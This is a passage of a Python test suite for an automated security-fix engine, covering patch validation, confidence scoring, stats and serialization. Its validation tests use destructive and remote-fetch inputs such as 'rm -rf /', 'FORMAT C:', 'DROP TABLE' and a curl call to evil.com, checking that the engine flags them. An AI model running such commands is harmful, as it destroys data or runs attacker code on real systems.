        # "Firewall configuration missing" contains "config" in "configuration"
        # which matches CONFIG_HARDENING before reaching the WAF_RULE check.
        # Use a title without config-related words to reach WAF_RULE.
        f = {"title": "Web application firewall bypass found", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.WAF_RULE

    # Default

    def test_no_match_returns_code_patch(self):
        f = {"title": "Generic vulnerability found", "description": "Some random issue"}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CODE_PATCH

    def test_empty_finding_returns_code_patch(self):
        f = {}
        assert AutoFixEngine._infer_fix_type(f) == FixType.CODE_PATCH

    def test_case_insensitive_matching(self):
        f = {"title": "OUTDATED DEPENDENCY FOUND", "description": ""}
        assert AutoFixEngine._infer_fix_type(f) == FixType.DEPENDENCY_UPDATE

    def test_description_takes_part_in_match(self):
        f = {"title": "Vulnerability", "description": "Uses an outdated component"}
        result = AutoFixEngine._infer_fix_type(f)
        assert result == FixType.DEPENDENCY_UPDATE


# ===========================================================================
# 15. _validate_fix Method
# ===========================================================================


class TestValidateFix:
    def setup_method(self):
        self.engine = make_engine()

    # Check 1: at least one content type

    def test_empty_fix_fails_check1(self):
        s = AutoFixSuggestion()
        result = self.engine._validate_fix(s)
        assert result["valid"] is False
        assert any("No patches" in issue for issue in result["issues"])

    def test_fix_with_code_patches_passes_check1(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="a.py", new_code="safe_code()")]
        )
        result = self.engine._validate_fix(s)
        assert "No patches" not in str(result["issues"])

    def test_fix_with_dependency_fixes_passes_check1(self):
        s = AutoFixSuggestion(
            dependency_fixes=[DependencyFix(package_name="pkg", fixed_version="1.1.0", current_version="1.0.0")]
        )
        result = self.engine._validate_fix(s)
        assert "No patches" not in str(result["issues"])

    def test_fix_with_config_changes_passes_check1(self):
        s = AutoFixSuggestion(config_changes={"hsts": "max-age=31536000"})
        result = self.engine._validate_fix(s)
        assert "No patches" not in str(result["issues"])

    # Check 2: dangerous patterns

    def test_rm_rf_detected(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="cleanup.sh", new_code="rm -rf /tmp/app")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False
        assert any("rm -rf" in issue for issue in result["issues"])

    def test_drop_table_detected(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="db.py", new_code="cursor.execute('DROP TABLE users')")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False
        assert any("DROP TABLE" in issue for issue in result["issues"])

    def test_delete_from_detected(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="db.py", new_code="DELETE FROM sessions")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False

    def test_eval_detected(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="handler.py", new_code="eval(user_input)")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False

    def test_curl_pipe_detected(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="setup.sh", new_code="; curl http://evil.com/payload.sh")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False

    def test_wget_pipe_detected(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="setup.sh", new_code="wget | bash")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False

    def test_format_c_detected(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="cleanup.bat", new_code="FORMAT C:")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False

    def test_dangerous_case_insensitive(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="db.py", new_code="RM -RF /")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False

    def test_safe_code_passes_check2(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="app.py", new_code="result = query.filter(id=user_id).first()")]
        )
        result = self.engine._validate_fix(s)
        assert not any("Dangerous pattern" in issue for issue in result["issues"])

    # Check 3: non-empty new_code

    def test_empty_new_code_fails_check3(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="app.py", new_code="")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False
        assert any("Empty new_code" in issue for issue in result["issues"])

    def test_whitespace_only_new_code_fails_check3(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="app.py", new_code="   ")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False
        assert any("Empty new_code" in issue for issue in result["issues"])

    def test_nonempty_new_code_passes_check3(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="app.py", new_code="safe_function()")]
        )
        result = self.engine._validate_fix(s)
        assert not any("Empty new_code" in issue for issue in result["issues"])

    # Check 4: valid dependency versions

    def test_empty_fixed_version_fails_check4(self):
        s = AutoFixSuggestion(
            dependency_fixes=[DependencyFix(package_name="pkg", current_version="1.0.0", fixed_version="")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False
        assert any("Invalid fixed version" in issue for issue in result["issues"])

    def test_same_version_fails_check4(self):
        s = AutoFixSuggestion(
            dependency_fixes=[DependencyFix(package_name="pkg", current_version="1.0.0", fixed_version="1.0.0")]
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is False
        assert any("Invalid fixed version" in issue for issue in result["issues"])

    def test_different_version_passes_check4(self):
        s = AutoFixSuggestion(
            dependency_fixes=[DependencyFix(package_name="pkg", current_version="1.0.0", fixed_version="1.0.1")]
        )
        result = self.engine._validate_fix(s)
        assert not any("Invalid fixed version" in issue for issue in result["issues"])

    # Score and structure

    def test_score_field_present(self):
        s = AutoFixSuggestion()
        result = self.engine._validate_fix(s)
        assert "score" in result
        assert 0.0 <= result["score"] <= 1.0

    def test_checks_passed_present(self):
        s = AutoFixSuggestion()
        result = self.engine._validate_fix(s)
        assert "checks_passed" in result
        assert "total_checks" in result

    def test_total_checks_is_7(self):
        """Validate all 7 safety checks run: artifacts, dangerous patterns,
        path traversal, dangerous imports, patch validity, dep versions, patch size."""
        s = AutoFixSuggestion()
        result = self.engine._validate_fix(s)
        assert result["total_checks"] == 7

    def test_perfect_validation(self):
        s = AutoFixSuggestion(
            code_patches=[CodePatch(file_path="app.py", new_code="safe_code()")],
            dependency_fixes=[DependencyFix(package_name="pkg", current_version="1.0.0", fixed_version="2.0.0")],
        )
        result = self.engine._validate_fix(s)
        assert result["valid"] is True
        assert result["checks_passed"] == 7
        assert result["score"] == 1.0
        assert result["issues"] == []

    def test_issues_list_present(self):
        s = AutoFixSuggestion()
        result = self.engine._validate_fix(s)
        assert "issues" in result
        assert isinstance(result["issues"], list)

    def test_valid_field_is_bool(self):
        s = AutoFixSuggestion()
        result = self.engine._validate_fix(s)
        assert "valid" in result
        assert isinstance(result["valid"], bool)

    def test_multiple_issues_accumulate(self):
        s = AutoFixSuggestion(
            code_patches=[
                CodePatch(file_path="a.py", new_code=""),      # empty new_code
                CodePatch(file_path="b.py", new_code="rm -rf /"),  # dangerous
            ]
        )
        result = self.engine._validate_fix(s)
        assert len(result["issues"]) >= 2

    def test_config_only_fix_passes_check1(self):
        s = AutoFixSuggestion(config_changes={"key": "value"})
        result = self.engine._validate_fix(s)
        checks_passed = result["checks_passed"]
        # Check 1 passes (config_changes), check 2 passes (no patches), check 3 passes (no patches)
        assert checks_passed >= 3


# ===========================================================================
# 16. _compute_confidence_fallback Static Method
# ===========================================================================


class TestComputeConfidenceFallback:
    # Base score

    def test_base_score_no_modifiers(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.5)

    # Dependency update boost

    def test_dependency_update_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.DEPENDENCY_UPDATE, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.7)  # 0.5 + 0.2

    def test_config_hardening_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.CONFIG_HARDENING, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.65)  # 0.5 + 0.15

    def test_other_fix_types_no_type_boost(self):
        for ft in [FixType.IAC_FIX, FixType.SECRET_ROTATION, FixType.PERMISSION_FIX,
                   FixType.WAF_RULE, FixType.INPUT_VALIDATION, FixType.OUTPUT_ENCODING,
                   FixType.CONTAINER_FIX]:
            s = AutoFixSuggestion(fix_type=ft, metadata={})
            score = AutoFixEngine._compute_confidence_fallback(s, {})
            assert score == pytest.approx(0.5), f"Expected 0.5 for {ft.name}, got {score}"

    # Validation boost

    def test_valid_validation_boost(self):
        s = AutoFixSuggestion(
            fix_type=FixType.CODE_PATCH,
            metadata={"validation": {"valid": True, "score": 0.0}},
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.65)  # 0.5 + 0.15

    def test_validation_score_boost(self):
        s = AutoFixSuggestion(
            fix_type=FixType.CODE_PATCH,
            metadata={"validation": {"valid": False, "score": 1.0}},
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.6)  # 0.5 + 0.1

    def test_full_validation_boost(self):
        s = AutoFixSuggestion(
            fix_type=FixType.CODE_PATCH,
            metadata={"validation": {"valid": True, "score": 1.0}},
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.75)  # 0.5 + 0.15 + 0.1

    def test_no_validation_key_no_crash(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert isinstance(score, float)
        assert 0.1 <= score <= 0.99

    def test_missing_validation_defaults_to_zero_score(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        # 0.5 (base) + no validation = 0.5
        assert score == pytest.approx(0.5)

    # Code patches and dep fixes boosts

    def test_code_patches_boost(self):
        s = AutoFixSuggestion(
            fix_type=FixType.CODE_PATCH,
            metadata={},
            code_patches=[CodePatch(file_path="a.py")],
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.55)  # 0.5 + 0.05

    def test_dependency_fixes_boost(self):
        s = AutoFixSuggestion(
            fix_type=FixType.CODE_PATCH,
            metadata={},
            dependency_fixes=[DependencyFix(package_name="pkg")],
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.55)  # 0.5 + 0.05

    def test_both_patches_and_dep_fixes_boost(self):
        s = AutoFixSuggestion(
            fix_type=FixType.CODE_PATCH,
            metadata={},
            code_patches=[CodePatch(file_path="a.py")],
            dependency_fixes=[DependencyFix(package_name="pkg")],
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.60)  # 0.5 + 0.05 + 0.05

    # CVE boost

    def test_single_cve_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={}, cve_ids=["CVE-2024-1"])
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.53)  # 0.5 + 0.03

    def test_three_cves_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={}, cve_ids=["CVE-1", "CVE-2", "CVE-3"])
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.59)  # 0.5 + 0.09

    def test_many_cves_capped_at_010(self):
        s = AutoFixSuggestion(
            fix_type=FixType.CODE_PATCH,
            metadata={},
            cve_ids=[f"CVE-{i}" for i in range(10)]  # 10 CVEs
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.60)  # 0.5 + 0.1 (capped)

    def test_no_cves_no_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={}, cve_ids=[])
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score == pytest.approx(0.5)

    # Severity boost

    def test_critical_severity_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {"severity": "critical"})
        assert score == pytest.approx(0.55)  # 0.5 + 0.05

    def test_high_severity_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {"severity": "high"})
        assert score == pytest.approx(0.53)  # 0.5 + 0.03

    def test_medium_severity_no_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {"severity": "medium"})
        assert score == pytest.approx(0.5)

    def test_low_severity_no_boost(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {"severity": "low"})
        assert score == pytest.approx(0.5)

    # Clamping to [0.1, 0.99]

    def test_score_never_below_01(self):
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score = AutoFixEngine._compute_confidence_fallback(s, {})
        assert score >= 0.1

    def test_score_never_above_099(self):
        s = AutoFixSuggestion(
            fix_type=FixType.DEPENDENCY_UPDATE,
            metadata={"validation": {"valid": True, "score": 1.0}},
            code_patches=[CodePatch(file_path="a.py")],
            dependency_fixes=[DependencyFix(package_name="x")],
            cve_ids=[f"CVE-{i}" for i in range(10)],
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {"severity": "critical"})
        assert score <= 0.99

    def test_full_boost_combination_clamped(self):
        s = AutoFixSuggestion(
            fix_type=FixType.DEPENDENCY_UPDATE,  # +0.2
            metadata={"validation": {"valid": True, "score": 1.0}},  # +0.15 + 0.1
            code_patches=[CodePatch(file_path="a.py")],  # +0.05
            dependency_fixes=[DependencyFix(package_name="x")],  # +0.05
            cve_ids=["CVE-1", "CVE-2", "CVE-3", "CVE-4", "CVE-5"],  # +0.1 (capped)
        )
        score = AutoFixEngine._compute_confidence_fallback(s, {"severity": "critical"})  # +0.05
        # Sum = 0.5 + 0.2 + 0.15 + 0.1 + 0.05 + 0.05 + 0.10 + 0.05 = 1.2 → clamped to 0.99
        assert score == pytest.approx(0.99)

    def test_severity_case_insensitive_both_match(self):
        # The code calls .lower() on severity so "CRITICAL" and "critical" both match
        s = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        score_lower = AutoFixEngine._compute_confidence_fallback(s, {"severity": "critical"})
        score_upper = AutoFixEngine._compute_confidence_fallback(s, {"severity": "CRITICAL"})
        # Both should produce the same score because .lower() normalizes severity
        assert score_lower == score_upper

    def test_score_range_for_all_fix_types(self):
        for ft in FixType:
            s = AutoFixSuggestion(fix_type=ft, metadata={})
            score = AutoFixEngine._compute_confidence_fallback(s, {})
            assert 0.1 <= score <= 0.99, f"Score {score} out of range for FixType.{ft.name}"

    def test_dep_update_higher_than_code_patch(self):
        s_dep = AutoFixSuggestion(fix_type=FixType.DEPENDENCY_UPDATE, metadata={})
        s_code = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        dep_score = AutoFixEngine._compute_confidence_fallback(s_dep, {})
        code_score = AutoFixEngine._compute_confidence_fallback(s_code, {})
        assert dep_score > code_score

    def test_config_hardening_higher_than_code_patch(self):
        s_conf = AutoFixSuggestion(fix_type=FixType.CONFIG_HARDENING, metadata={})
        s_code = AutoFixSuggestion(fix_type=FixType.CODE_PATCH, metadata={})
        conf_score = AutoFixEngine._compute_confidence_fallback(s_conf, {})
        code_score = AutoFixEngine._compute_confidence_fallback(s_code, {})
        assert conf_score > code_score


# ===========================================================================
# 17. AutoFixEngine Init & Internal State
# ===========================================================================


class TestAutoFixEngineInit:
    def test_initial_fixes_empty(self):
        e = make_engine()
        assert e._fixes == {}

    def test_initial_history_empty(self):
        e = make_engine()
        assert e._history == []

    def test_initial_stats_structure(self):
        e = make_engine()
        assert e._stats["total_generated"] == 0
        assert e._stats["total_applied"] == 0
        assert e._stats["total_prs_created"] == 0
        assert e._stats["total_merged"] == 0
        assert e._stats["total_failed"] == 0
        assert e._stats["total_rolled_back"] == 0
        assert isinstance(e._stats["by_type"], dict)
        assert e._stats["by_confidence"] == {"high": 0, "medium": 0, "low": 0}
        assert e._stats["avg_confidence_score"] == 0.0

    def test_llm_initially_none(self):
        e = make_engine()
        assert e._llm is None

    def test_brain_initially_none(self):
        e = make_engine()
        assert e._brain is None

    def test_bus_initially_none(self):
        e = make_engine()
        assert e._bus is None

    def test_pr_gen_initially_none(self):
        e = make_engine()
        assert e._pr_gen is None

    def test_each_instance_has_independent_state(self):
        e1 = make_engine()
        e2 = make_engine()
        e1._fixes["fix-1"] = AutoFixSuggestion(fix_id="fix-1")
        assert len(e2._fixes) == 0


# ===========================================================================
# 18. _update_stats Method
# ===========================================================================


class TestUpdateStats:
    def test_increments_total_generated(self):
        e = make_engine()
        s = make_suggestion(fix_type=FixType.CODE_PATCH, confidence=FixConfidence.MEDIUM, confidence_score=0.0)
        e._update_stats(s)
        assert e._stats["total_generated"] == 1

    def test_tracks_by_type(self):
        e = make_engine()
        s = make_suggestion(fix_type=FixType.DEPENDENCY_UPDATE)
        e._update_stats(s)
        assert e._stats["by_type"]["dependency_update"] == 1

    def test_tracks_by_confidence_high(self):
        e = make_engine()
        s = make_suggestion(confidence=FixConfidence.HIGH, confidence_score=0.9)
        e._update_stats(s)
        assert e._stats["by_confidence"]["high"] == 1

    def test_tracks_by_confidence_low(self):
        e = make_engine()
        s = make_suggestion(confidence=FixConfidence.LOW, confidence_score=0.4)
        e._update_stats(s)
        assert e._stats["by_confidence"]["low"] == 1

    def test_multiple_updates_accumulate(self):
        e = make_engine()
        for i in range(5):
            s = make_suggestion(fix_id=f"fix-{i:016x}", fix_type=FixType.CODE_PATCH)
            e._update_stats(s)
        assert e._stats["total_generated"] == 5
        assert e._stats["by_type"]["code_patch"] == 5

    def test_avg_confidence_score_with_stored_fix(self):
        e = make_engine()
        s = make_suggestion(fix_id="fix-0000000000000001", confidence_score=0.8)
        e._fixes["fix-0000000000000001"] = s
        e._update_stats(s)
        assert e._stats["avg_confidence_score"] == pytest.approx(0.8)

    def test_multiple_types_tracked_independently(self):
        e = make_engine()
        s1 = make_suggestion(fix_id="fix-0000000000000001", fix_type=FixType.CODE_PATCH)
        s2 = make_suggestion(fix_id="fix-0000000000000002", fix_type=FixType.DEPENDENCY_UPDATE)
        e._update_stats(s1)
        e._update_stats(s2)
        assert e._stats["by_type"]["code_patch"] == 1
        assert e._stats["by_type"]["dependency_update"] == 1

    def test_new_fix_type_key_created(self):
        e = make_engine()
        s = make_suggestion(fix_type=FixType.WAF_RULE)
        e._update_stats(s)
        assert "waf_rule" in e._stats["by_type"]
        assert e._stats["by_type"]["waf_rule"] == 1


# ===========================================================================
# 19. get_fix Query Method
# ===========================================================================


class TestGetFix:
    def test_returns_none_for_unknown_id(self):
        e = make_engine()
        assert e.get_fix("nonexistent") is None

    def test_returns_suggestion_after_storing(self):
        e = make_engine()
        s = make_suggestion(fix_id="fix-abc1234567890123")
        e._fixes["fix-abc1234567890123"] = s
        result = e.get_fix("fix-abc1234567890123")
        assert result is s

    def test_returns_none_empty_string(self):
        e = make_engine()
        assert e.get_fix("") is None

    def test_does_not_modify_storage(self):
        e = make_engine()
        e.get_fix("no-such-id")
        assert len(e._fixes) == 0

    def test_returns_same_object_reference(self):
        e = make_engine()
        s = make_suggestion(fix_id="fix-test1234567890123")
        e._fixes["fix-test1234567890123"] = s
        result = e.get_fix("fix-test1234567890123")
        assert result is s  # same reference, not a copy


# ===========================================================================
# 20. list_fixes Query Method
# ===========================================================================


class TestListFixes:
    def setup_method(self):
        self.engine = make_engine()
        self.fixes = []
        for i in range(5):
            s = AutoFixSuggestion(
                fix_id=f"fix-{i:016x}",
                finding_id=f"FIND-{i % 2}",  # FIND-0 and FIND-1 alternating
                fix_type=FixType.CODE_PATCH if i % 2 == 0 else FixType.DEPENDENCY_UPDATE,
                status=FixStatus.GENERATED if i < 3 else FixStatus.APPLIED,
            )
            self.engine._fixes[s.fix_id] = s
            self.fixes.append(s)

    def test_list_all_returns_all(self):
        result = self.engine.list_fixes()
        assert len(result) == 5

    def test_filter_by_finding_id(self):
        result = self.engine.list_fixes(finding_id="FIND-0")
        # indices 0, 2, 4 → FIND-0
        assert len(result) == 3
        assert all(f.finding_id == "FIND-0" for f in result)

    def test_filter_by_status(self):
        result = self.engine.list_fixes(status=FixStatus.APPLIED)
        assert len(result) == 2
        assert all(f.status == FixStatus.APPLIED for f in result)

    def test_filter_by_fix_type(self):
        result = self.engine.list_fixes(fix_type=FixType.CODE_PATCH)
        # CODE_PATCH at indices 0, 2, 4 → 3
        assert len(result) == 3
        assert all(f.fix_type == FixType.CODE_PATCH for f in result)

    def test_limit_parameter(self):
        result = self.engine.list_fixes(limit=2)
        assert len(result) == 2

    def test_empty_engine_returns_empty(self):
        e = make_engine()
        assert e.list_fixes() == []

    def test_no_match_returns_empty(self):
        result = self.engine.list_fixes(finding_id="FIND-NONE")
        assert result == []

    def test_limit_zero_returns_empty(self):
        result = self.engine.list_fixes(limit=0)
        assert result == []

    def test_default_limit_50(self):
        e = make_engine()
        for i in range(60):
            s = AutoFixSuggestion(fix_id=f"fix-{i:016x}")
            e._fixes[s.fix_id] = s
        result = e.list_fixes()
        assert len(result) == 50

    def test_filter_generated_status(self):
        result = self.engine.list_fixes(status=FixStatus.GENERATED)
        assert len(result) == 3
        assert all(f.status == FixStatus.GENERATED for f in result)

    def test_combined_filters_finding_and_type(self):
        # FIND-0 with CODE_PATCH: indices 0, 2, 4 → all 3 are CODE_PATCH and FIND-0
        result = self.engine.list_fixes(finding_id="FIND-0", fix_type=FixType.CODE_PATCH)
        assert len(result) == 3


# ===========================================================================
# 21. get_stats Method
# ===========================================================================


class TestGetStats:
    def test_returns_dict(self):
        e = make_engine()
        stats = e.get_stats()
        assert isinstance(stats, dict)

    def test_includes_total_fixes_stored(self):
        e = make_engine()
        e._fixes["fix-1"] = AutoFixSuggestion(fix_id="fix-1")
        stats = e.get_stats()
        assert stats["total_fixes_stored"] == 1

    def test_total_fixes_stored_zero_initially(self):
        e = make_engine()
        stats = e.get_stats()
        assert stats["total_fixes_stored"] == 0

    def test_stats_keys_present(self):
        e = make_engine()
        stats = e.get_stats()
        assert "total_generated" in stats
        assert "total_applied" in stats
        assert "total_prs_created" in stats
        assert "total_merged" in stats
        assert "total_failed" in stats
        assert "total_rolled_back" in stats
        assert "by_type" in stats
        assert "by_confidence" in stats
        assert "avg_confidence_score" in stats

    def test_does_not_mutate_internal_stats(self):
        e = make_engine()
        stats1 = e.get_stats()
        stats2 = e.get_stats()
        assert stats1["total_generated"] == stats2["total_generated"]

    def test_total_fixes_stored_reflects_actual_count(self):
        e = make_engine()
        for i in range(3):
            e._fixes[f"fix-{i}"] = AutoFixSuggestion(fix_id=f"fix-{i}")
        stats = e.get_stats()
        assert stats["total_fixes_stored"] == 3


# ===========================================================================
# 22. get_history Method
# ===========================================================================


class TestGetHistory:
    def test_empty_history(self):
        e = make_engine()
        assert e.get_history() == []

    def test_history_is_reversed(self):
        e = make_engine()
        e._history = [
            {"action": "generate", "fix_id": "fix-1"},
            {"action": "apply", "fix_id": "fix-2"},
        ]
        result = e.get_history()
        assert result[0]["action"] == "apply"
        assert result[1]["action"] == "generate"

    def test_limit_respected(self):
        e = make_engine()
        for i in range(20):
            e._history.append({"action": "generate", "fix_id": f"fix-{i}"})
        result = e.get_history(limit=5)
        assert len(result) == 5

    def test_default_limit_100(self):
        e = make_engine()
        for i in range(150):
            e._history.append({"action": "generate", "fix_id": f"fix-{i}"})
        result = e.get_history()
        assert len(result) == 100

    def test_returns_list(self):
        e = make_engine()
        assert isinstance(e.get_history(), list)

    def test_most_recent_first(self):
        e = make_engine()
        for i in range(10):
            e._history.append({"action": "step", "index": i})
        result = e.get_history(limit=10)
        assert result[0]["index"] == 9
        assert result[-1]["index"] == 0

    def test_limit_larger_than_history_returns_all(self):
        e = make_engine()
        for i in range(5):
            e._history.append({"action": "step", "fix_id": f"fix-{i}"})
        result = e.get_history(limit=100)
        assert len(result) == 5


# ===========================================================================
# 23. to_dict Serialization
# ===========================================================================


class TestToDict:
    def setup_method(self):
        self.engine = make_engine()

    def test_basic_serialization_returns_dict(self):
        s = AutoFixSuggestion(
            fix_id="fix-abc",
            fix_type=FixType.CODE_PATCH,
            status=FixStatus.GENERATED,
            confidence=FixConfidence.HIGH,
        )
        d = self.engine.to_dict(s)
        assert isinstance(d, dict)

    def test_fix_type_serialized_as_value(self):
        s = make_suggestion(fix_type=FixType.DEPENDENCY_UPDATE)
        d = self.engine.to_dict(s)
        assert d["fix_type"] == "dependency_update"
        assert not isinstance(d["fix_type"], FixType)

    def test_status_serialized_as_value(self):
        s = make_suggestion(status=FixStatus.PR_CREATED)
        d = self.engine.to_dict(s)
        assert d["status"] == "pr_created"
        assert not isinstance(d["status"], FixStatus)

    def test_confidence_serialized_as_value(self):
        s = make_suggestion(confidence=FixConfidence.LOW)
        d = self.engine.to_dict(s)
        assert d["confidence"] == "low"
        assert not isinstance(d["confidence"], FixConfidence)

    def test_code_patches_patch_format_serialized(self):
        s = AutoFixSuggestion(
            fix_id="fix-x",
            code_patches=[
                CodePatch(file_path="app.py", patch_format=PatchFormat.UNIFIED_DIFF),
                CodePatch(file_path="b.py", patch_format=PatchFormat.TERRAFORM),
            ]
        )
        d = self.engine.to_dict(s)
        assert d["code_patches"][0]["patch_format"] == "unified_diff"
        assert d["code_patches"][1]["patch_format"] == "terraform"

    def test_all_fix_types_serialize(self):
        for ft in FixType:
            s = make_suggestion(fix_type=ft)
            d = self.engine.to_dict(s)
            assert d["fix_type"] == ft.value

    def test_all_statuses_serialize(self):
        for status in FixStatus:
            s = make_suggestion(status=status)
            d = self.engine.to_dict(s)
            assert d["status"] == status.value

    def test_all_confidence_levels_serialize(self):
        for conf in FixConfidence:
            s = make_suggestion(confidence=conf)
            d = self.engine.to_dict(s)
            assert d["confidence"] == conf.value

    def test_nested_fields_preserved(self):
        s = AutoFixSuggestion(
            fix_id="fix-1",
            cve_ids=["CVE-2024-1", "CVE-2024-2"],
            metadata={"key": "value"},
            pr_number=42,
        )
        d = self.engine.to_dict(s)
        assert d["cve_ids"] == ["CVE-2024-1", "CVE-2024-2"]
        assert d["metadata"] == {"key": "value"}
        assert d["pr_number"] == 42

    def test_empty_patches_serializes_clean(self):
        s = make_suggestion(code_patches=[])
        d = self.engine.to_dict(s)
        assert d["code_patches"] == []

    def test_all_patch_formats_serialize(self):
        for fmt in PatchFormat:
            s = AutoFixSuggestion(
                code_patches=[CodePatch(file_path="f.py", patch_format=fmt)]
            )
            d = self.engine.to_dict(s)
            assert d["code_patches"][0]["patch_format"] == fmt.value


# ===========================================================================
# 24. get_autofix_engine Singleton
# ===========================================================================


class TestGetAutofixEngineSingleton:
    def test_returns_autofix_engine_instance(self):
        e = get_autofix_engine()
        assert isinstance(e, AutoFixEngine)

    def test_returns_same_instance_twice(self):
        e1 = get_autofix_engine()
        e2 = get_autofix_engine()
        assert e1 is e2

    def test_singleton_has_expected_attributes(self):
        e = get_autofix_engine()
        assert hasattr(e, "_fixes")
        assert hasattr(e, "_stats")
        assert hasattr(e, "_history")


# ===========================================================================
# 25. _CWE_CATEGORY_MAP and _FIXTYPE_CATEGORY_MAP Coverage
# ===========================================================================


class TestCategoryMaps:
    def test_cwe_map_all_values_are_strings(self):
        for k, v in _CWE_CATEGORY_MAP.items():
            assert isinstance(k, str), f"Key {k!r} is not a string"
            assert isinstance(v, str), f"Value {v!r} for key {k!r} is not a string"

    def test_cwe_map_all_keys_start_with_cwe(self):
        for k in _CWE_CATEGORY_MAP:
            assert k.startswith("CWE-"), f"Key {k!r} doesn't start with CWE-"

    def test_fixtype_map_keys_are_fix_type_values(self):
        fix_type_values = {ft.value for ft in FixType}
        for k in _FIXTYPE_CATEGORY_MAP:
            assert k in fix_type_values, f"{k!r} is not a valid FixType value"

    def test_fixtype_map_covers_non_default_types(self):
        assert "dependency_update" in _FIXTYPE_CATEGORY_MAP
        assert "config_hardening" in _FIXTYPE_CATEGORY_MAP
        assert "secret_rotation" in _FIXTYPE_CATEGORY_MAP
        assert "container_fix" in _FIXTYPE_CATEGORY_MAP

    def test_cwe_map_not_empty(self):
        assert len(_CWE_CATEGORY_MAP) > 0

    def test_fixtype_map_not_empty(self):
        assert len(_FIXTYPE_CATEGORY_MAP) > 0

    def test_cwe_map_contains_owasp_top10_cwes(self):
        # OWASP Top 10 CWEs that should be present
        owasp_cwes = ["CWE-89", "CWE-79", "CWE-287", "CWE-918", "CWE-22"]
        for cwe in owasp_cwes:
            assert cwe in _CWE_CATEGORY_MAP, f"{cwe} missing from CWE map"


# ===========================================================================
# 26. Edge Cases and Integration Scenarios
# ===========================================================================


class TestEdgeCases:
    def test_suggestion_metadata_mutation_persists(self):
        s = AutoFixSuggestion()
        s.metadata["validation"] = {"valid": True, "score": 1.0}
        assert s.metadata["validation"]["valid"] is True

    def test_code_patch_append_to_suggestion(self):
        s = AutoFixSuggestion()
        p = CodePatch(file_path="app.py", new_code="safe()")
        s.code_patches.append(p)
        assert len(s.code_patches) == 1
        assert s.code_patches[0].file_path == "app.py"

    def test_dependency_fix_append_to_suggestion(self):
        s = AutoFixSuggestion()
        d = DependencyFix(package_name="axios", fixed_version="1.0.0")
        s.dependency_fixes.append(d)
        assert len(s.dependency_fixes) == 1
        assert s.dependency_fixes[0].package_name == "axios"

    def test_validate_fix_config_only_passes_3_checks(self):
        engine = make_engine()
        s = AutoFixSuggestion(config_changes={"key": "value"})
        result = engine._validate_fix(s)
        # Check 1: config_changes exists → pass
        # Check 2: no dangerous patterns in patches → pass
